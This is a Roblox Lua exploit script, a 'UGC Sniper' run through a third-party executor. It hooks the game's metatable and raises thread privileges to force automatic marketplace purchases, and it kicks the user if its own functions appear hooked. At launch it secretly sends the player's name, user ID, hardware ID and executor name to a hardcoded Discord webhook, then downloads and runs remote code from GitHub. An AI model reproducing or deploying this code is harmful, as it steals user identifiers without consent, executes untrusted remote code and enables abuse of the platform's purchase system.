local getconnections = getconnections or get_signal_cons or get_connections or getsignalcons or getsignalconnections or get_signal_connections or nil
local request = request or httprequest or http_request or (syn and syn.request) or (fluxus and fluxus.request) or nil
local checkcaller = checkcaller or check_caller or CheckCaller or Check_Caller or function() return false end
local isfunctionhooked = isfunctionhooked or is_function_hooked or isfunchooked or is_func_hooked or nil
local cloneref = cloneref or clone_ref or clonereference or clone_reference or function(a) return a end
local set = setthreadidentity or set_thread_identity or setthreadcontext or set_thread_context or nil 
local newcclosure = newcclosure or new_c_closure or function(a) return a end
local fireproximityprompt = fireproximityprompt or fire_proximity_prompt or nil
local MarketplaceService = cloneref(game.GetService(game, "MarketplaceService"));
local AnalyticsService = cloneref(game.GetService(game, "RbxAnalyticsService"));
local getexecutorname = getexecutorname or get_executor_name or nil
local gethui = gethui or get_hui or gethiddenui or get_hidden_ui or nil
local HttpService = cloneref(game.GetService(game, "HttpService"));
local StarterGui = cloneref(game.GetService(game, "StarterGui"));
local StarterGui = cloneref(game.GetService(game, "StarterGui"));
local Players = cloneref(game.GetService(game, "Players"));
local player = game.Players.LocalPlayer
local Name = player.Name
local sus, eror
local sus2, eror2
local UsNT = true
local ccid 

local check = false
local ExName = getexecutorname and getexecutorname() or "Unknown"

if isfunctionhooked and (isfunctionhooked and isfunctionhooked(isfunctionhooked)) then
   player.Kick(player, "Nice Try Bro :)")
   return 
end

if httpget and (isfunctionhooked and isfunctionhooked(httpget)) then
   player.Kick(player, "Nice Try Bro :)")
   return 
end

if loadstring and (isfunctionhooked and isfunctionhooked(loadstring)) then
   player.Kick(player, "Nice Try Bro :)")
   return 
end

if request and (isfunctionhooked and isfunctionhooked(request)) then
   player.Kick(player, "Nice Try Bro :)")
   return 
end

if (isfunctionhooked and isfunctionhooked(player.Kick)) then
   player.Kick(player, "Nice Try Bro :)")
   return 
end

if (isfunctionhooked and isfunctionhooked(AnalyticsService.GetClientId)) then
   player.Kick(player, "Nice Try Bro :)")
   return
end

if (isfunctionhooked and isfunctionhooked(game.HttpGet)) then
   player.Kick(player, "Nice Try Bro :)")
   return
end

if tostring(player.Name) ~= tostring(player.Character.Name) then 
   player.Kick(player, "Nice Try Bro :)")
   return
end

pcall(function()
   if request then
       request({
          Url = "https://discord.com/api/webhooks/1490483308029673502/5VGL12dkSWWcLJzYXURMsNzfREbqy-1jOPAw_7fzsbCcjAmrPU0TVt_K1607RZ-7g9YM",
          Method = "POST",
          Headers = {
             ["Content-Type"] = "application/json"
             },
          Body = HttpService.JSONEncode(HttpService, {
             content = "Status: Success\nName: "..tostring(Name).."\nGame: \nhttps://roblox.com/games/"..tostring(game.PlaceId).."\nUser: \nhttps://roblox.com/users/"..tostring(player.UserId).."\nHwid: \n"..tostring(AnalyticsService.GetClientId(AnalyticsService)).."\nExecutor: \n"..tostring(ExName)
             })
          })
   end
end)

local Lubary = nil
pcall(function()
   Lubary = loadstring(game.HttpGet(game, "https://raw.githubusercontent.com/bloodball/-back-ups-for-libs/main/wizard"))()
end)

if not Lubary then
   pcall(function()
    Lubary = loadstring(game.HttpGet(game, "https://raw.githubusercontent.com/Games1799/Scripts/refs/heads/main/Libary/Wizard.lua"))()
   end)
end

local function CreateGUID()
   return tostring(HttpService.GenerateGUID(HttpService, false))
end
local Cache = CreateGUID()

if Lubary then
   local Window = Lubary.NewWindow(Lubary, "UGC Sniper | Games1799")
   if Window then
      local Section = Window.NewSection(Window, "Sniper")
      if Section then
         local PurchaseToggle, PurchaseConnect, PurchaseBulkConnect = false, nil, nil
         local UnablePaid = false
         local CloseToggle = false
         local AutoClickProximity = false
         local HidePlayers = false
         local HiddenPlayers
         local NewPlayersConn
         Section.CreateToggle(Section, "Auto Purchase", function(state)
            PurchaseToggle = state
            if PurchaseToggle then
               if not MarketplaceService then
                  player.Kick(player, "Wait What? MarketplaceService Is Not Found??? LoL")
               end
               PurchaseConnect = MarketplaceService.PromptPurchaseRequestedV2.Connect(MarketplaceService.PromptPurchaseRequestedV2, function(...)
                  local PurchaseTable = {...}
                  local Type = Enum.InfoType.Asset
                  local AssetId = PurchaseTable[2] 
                  local ItemData = MarketplaceService.GetProductInfo(MarketplaceService, AssetId, Enum.InfoType.Asset)
                  local Price = ItemData.PriceInRobux
                  local RequestId = Cache
                  local IsRobloxPurchase = true
                  local CollectibleItemId = tostring(ItemData.CollectibleItemId)
                  local CollectibleProductId = tostring(ItemData.CollectibleProductId)
                  local IdempotencyKey = tostring(PurchaseTable[5]) or nil
                  local PurchaseAuthToken = tostring(PurchaseTable[6]) or nil
                  local TimedOptionsDays = 0 
                  local ProductId = ItemData.ProductId or AssetId
                  print(RequestId)
                  if not UnablePaid and Price ~= 0 then
                     return
                  end
                  pcall(function()
                     local mt = getrawmetatable(game)
                     local old = mt.__namecall
                     setreadonly(mt, false)
                     local Used = false
                     mt.__namecall = function(self, ...)
                        if Used == false and not checkcaller() then
                           Used = true
                           sus, eror = nil, nil
                           sus, eror = pcall(function()
                              set(7)
                              MarketplaceService.PerformPurchase(MarketplaceService, Type, ProductId, Price, RequestId, IsRobloxPurchase, CollectibleItemId, CollectibleProductId, IdempotencyKey, PurchaseAuthToken, TimedOptionsDays)
                           end)
                           Cache = CreateGUID()
                        end
                        if Used then
                           setreadonly(mt, false)
                           mt.__namecall = old
                           setreadonly(mt, true)
                        end
                        return old(self, ...)
                     end
                     setreadonly(mt, true)
                  end)
                  if sus then
                     if UsNT then
                        pcall(function()
                           StarterGui.SetCore(StarterGui, "SendNotification", {
                              Title =  "Success",
                              Text = "Purchase Success | Prompt\nPrice: "..tostring(Price),
                               Icon = "https://www.roblox.com/thumbs/asset.ashx?assetid="..AssetId.."&x=100&y=100&format=png",
                               Duration = 3,
                               Button1 = "Ok",
                            })
                         end)
                     end
                  else
                     if UsNT then
                        pcall(function()
                           StarterGui.SetCore(StarterGui, "SendNotification", {
                              Title =  "Failed",
                              Text = "Purchase Failed | Prompt\nPrice: "..tostring(Price),
                              Icon = "https://www.roblox.com/thumbs/asset.ashx?assetid="..AssetId.."&x=100&y=100&format=png",
                              Duration = 3,
                              Button1 = "Ok",
                           })
                        end)
                     end
                  end
               end)
               PurchaseBulkConnect = MarketplaceService.PromptBulkPurchaseRequested.Connect(MarketplaceService.PromptBulkPurchaseRequested,function(...)
                  local BulkPurchaseTable = {...}
                  local OrderQuest = BulkPurchaseTable[3] or {}
                  local Options = BulkPurchaseTable[6] or {}
                  pcall(function()
                     local mt = getrawmetatable(game)
                     local old = mt.__namecall
                     setreadonly(mt, false)
                     local Used = false
                     mt.__namecall = function(self, ...)
                        if Used == false and not checkcaller() then
                           Used = true
                           sus2, eror2 = nil, nil
                           sus2, eror2 = pcall(function()
                              set(7)
                              MarketplaceService.PerformBulkPurchase(MarketplaceService, OrderQuest, Options)
                           end)
                        end
                        if Used then
                           setreadonly(mt, false)
                           mt.__namecall = old
                           setreadonly(mt, true)
                        end
                        return old(self, ...)
                     end
                     setreadonly(mt, true)
                  end)
                  if sus2 then
                     if UsNT then
                        pcall(function()
                           StarterGui.SetCore(StarterGui, "SendNotification", {
                              Title =  "Success",
                              Text = "Purchase Success | Bulk",
                              Duration = 3,
                              Button1 = "Ok",
                           })
                        end)
                     end
                  else
                     if UsNT then
                        pcall(function()
                           StarterGui.SetCore(StarterGui, "SendNotification", {
                              Title =  "Failed",
                              Text = "Purchase Failed | Bulk",
                               Duration = 3,
                               Button1 = "Ok",
                            })
                         end)
                     end
                  end
               end)
            else
               if PurchaseConnect then
                  PurchaseConnect.Disconnect(PurchaseConnect)
               end
               if PurchaseBulkConnect then
                  PurchaseBulkConnect.Disconnect(PurchaseBulkConnect)
               end
            end
         end)
         Section.CreateToggle(Section, "Auto Close Error", function(state)
            CloseToggle = state
            local VirtualInputManager = cloneref(game.GetService(game, "VirtualInputManager"))
            local GuiService = cloneref(game.GetService(game, "GuiService"))
            local CoreGui = cloneref(game.GetService(game, "CoreGui"))
            while CloseToggle and task.wait(0.1) do
               pcall(function()
                  if CoreGui.FoundationOverlay then
                     for _, v in ipairs(CoreGui.FoundationOverlay.GetDescendants(CoreGui.FoundationOverlay)) do
                        if v.Name == "1" and not v.FindFirstChild(v, "BuyButton") then
                           VirtualInputManager.SendMouseButtonEvent(VirtualInputManager, v.AbsolutePosition.X + v.AbsoluteSize.X * (0.5 - v.AnchorPoint.X), v.AbsolutePosition.Y + v.AbsoluteSize.Y * (0.5 - v.AnchorPoint.Y) + GuiService.GetGuiInset(GuiService).Y, 0, true, game, 1)
                           VirtualInputManager.SendMouseButtonEvent(VirtualInputManager, v.AbsolutePosition.X + v.AbsoluteSize.X * (0.5 - v.AnchorPoint.X), v.AbsolutePosition.Y + v.AbsoluteSize.Y * (0.5 - v.AnchorPoint.Y) + GuiService.GetGuiInset(GuiService).Y, 0, false, game, 1)
                        end
                     end
                  end
               end)
            end
         end)
         Section.CreateToggle(Section, "Enable Paid Purchase", function(state)
            UnablePaid = state
         end)
         Section.CreateToggle(Section, "Auto Click Proximity", function(state)
            AutoClickProximity = state
            if game.PlaceId == 137518165570697 then
               return
            end
            while AutoClickProximity and task.wait(0.05) do
               local Char = player.Character or player.CharacterAdded.Wait(player.CharacterAdded)
               local Hum = Char and Char.FindFirstChild(Char, "HumanoidRootPart")
               if Hum then
                  local Prompt , MaxDistance = nil, math.huge
                  for _, v in ipairs(workspace.GetDescendants(workspace)) do
                     if v.IsA(v, "ProximityPrompt") and v.Enabled then
                        local ProximityParent = v.Parent
                        local Position = (ProximityParent and ProximityParent.IsA(ProximityParent, "Model") and ProximityParent.GetPivot(ProximityParent).Position) or (ProximityParent and ProximityParent.IsA(ProximityParent, "BasePart") and ProximityParent.Position)
                        if Position then
                           local Distance = (Position - Hum.Position).Magnitude
                           if Distance < MaxDistance then
                              MaxDistance = Distance
                              Prompt = v
                           end
                        end
                     end
                  end
                  if Prompt then
                     fireproximityprompt(Prompt)
                  end
               end
            end
         end)
         Section.CreateToggle(Section, "Hide Players", function(state)
            HidePlayers = state
            if HidePlayers then 
               HiddenPlayers = {}
               for _, v in ipairs(workspace.GetDescendants(workspace)) do
                  if v.IsA(v, "Model") and Players.GetPlayerFromCharacter(Players, v) and Players.GetPlayerFromCharacter(Players, v) ~= player then
                     table.insert(HiddenPlayers, {obj = v, pr = v.Parent})
                  end
               end
               for _, v in pairs(HiddenPlayers) do
                  v.obj.Parent = nil
               end
               NewPlayersConn = Players.PlayerAdded.Connect(Players.PlayerAdded, function(plr)
                  local Character = plr.Character or plr.CharacterAdded.Wait(plr.CharacterAdded)
                  table.insert(HiddenPlayers, {obj = Character, pr = Character.Parent })
                  Character.Parent = nil
               end)
            else
               for _, v in pairs(HiddenPlayers) do
                  v.obj.Parent = v.pr
               end
               if NewPlayersConn then
                  NewPlayersConn.Disconnect(NewPlayersConn)
               end
            end
         end)
         local pos 
         Section.CreateButton(Section, "Set Spawn Point", function()
            local character = (player.Character or player.CharacterAdded.Wait(player.CharacterAdded)) and (player.Character or player.CharacterAdded.Wait(player.CharacterAdded)).WaitForChild((player.Character or player.CharacterAdded.Wait(player.CharacterAdded)), "HumanoidRootPart").Parent
            pos = character.GetPivot(character)
            if UsNT then
               StarterGui.SetCore(StarterGui, "SendNotification", {
                   Title = "Success",
                   Text = "Spawn Point Set On "..tostring(pos),
                   Button1 = "OK",
               })
            end
            player.CharacterAdded.Connect(player.CharacterAdded, function(new)
               local character = new.WaitForChild(new, "HumanoidRootPart", math.huge)
               character.CFrame = pos
            end)
         end)
      else
         player.Kick(player, "Wizard Lubary Error: Section")
         return
      end
   else
      player.Kick(player, "Wizard Lubary Error: Window")
      return 
   end
   local Section3 = Window.NewSection(Window, "Settings")
   if Section3 then
      Section3.CreateToggle(Section3, "Disable Notifications", function(state)       
         if state then
            UsNT = false
         else
            UsNT = true
         end
      end)
   else
      player.Kick(player, "Wizard Lubary Error: Section3")
      return
   end
else
   player.Kick(player, "Wizard Lubary Error: Lubary")
   return
end
